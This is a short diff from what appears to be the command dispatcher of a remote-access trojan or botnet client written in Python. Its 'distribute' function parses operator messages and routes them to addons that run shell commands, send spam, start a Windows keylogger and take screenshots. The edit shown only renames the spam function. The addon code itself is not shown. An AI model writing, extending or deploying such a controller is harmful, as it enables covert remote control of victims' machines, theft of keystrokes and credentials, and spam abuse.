@@ -5,7 +5,7 @@ def distribute(messageSent):
 	if messageSent.find ( 'cmd' ) != -1:
 		return addons.shell.shell(messageSent.split('->')[1])
 	elif messageSent.find ( 'spam' ) != -1:
-		return addons.spam.sendmail_web(messageSent.split('->')[1].split('-')[0],messageSent.split('->')[1].split('-')[1])
+		return addons.spam.spam(messageSent.split('->')[1].split('-')[0],messageSent.split('->')[1].split('-')[1])
 	elif messageSent.find ( 'keylogger' ) != -1:
 		return addons.keylogger.keylogger_win(messageSent.split('->')[1])
 	elif messageSent.find("screenshot") != -1:
